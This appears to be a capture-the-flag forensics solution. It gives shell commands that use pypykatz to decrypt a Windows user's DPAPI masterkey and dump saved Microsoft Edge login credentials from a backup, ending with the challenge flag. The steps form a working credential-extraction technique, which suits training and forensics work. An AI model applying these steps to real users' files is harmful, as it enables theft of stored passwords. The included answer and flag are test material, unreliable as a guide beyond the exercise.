```
# This Requires Solving Part 1: Retrieved Password "P@ssw0rd!"

# Recognise the directory is a Windows user home Directory with "AppData" Present
unzip backup.zip

# Install pypykatz (https://github.com/skelsec/pypykatz)
pip3 install pypykatz

# Observe the Note in Documents mentioning the use of Microsoft Edge
cat surfersam/Documents/notes.txt

# Plenty of Guides/Writeups of Descrypting Chrome/Edge Secrets Offline (e.g https://0xdf.gitlab.io/2023/04/01/htb-sekhmet.html#dpapi-offline-method-1)

# Locate User SID and Credential File
ls surfersam/AppData/Roaming/Microsoft/Protect
ls surfersam/AppData/Roaming/Microsoft/Protect/S-1-5-21-91895096-547579369-2258613375-1000

# Get the Decryption Key from "LocalState"
cat surfersam/AppData/Local/Microsoft/Edge/User\ Data/Local\ State | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > localstate_key

# (Optional) Verify GUID Matches Credential we want to Decrypt
pypykatz dpapi describe blob localstate_key

# Use the Password from Previous Challenge and Users SID to create "prekeys"
pypykatz dpapi prekey password "S-1-5-21-91895096-547579369-2258613375-1000" "P@ssw0rd!" > prekey_hashes

# Create Masterkey File
pypykatz dpapi masterkey surfersam/AppData/Roaming/Microsoft/Protect/S-1-5-21-91895096-547579369-2258613375-1000/7a4e0eb6-4f40-42db-8830-7c5c65f17170 prekey_hashes -o masterkey_file

# Decrypt all the Data
pypykatz dpapi chrome --logindata "surfersam/AppData/Local/Microsoft/Edge/User Data/Default/Login Data" masterkey_file "surfersam/AppData/Local/Microsoft/Edge/User Data/Local State"

# Flag
pecan{1_cL1cK3d_n0t_n0w!}
```
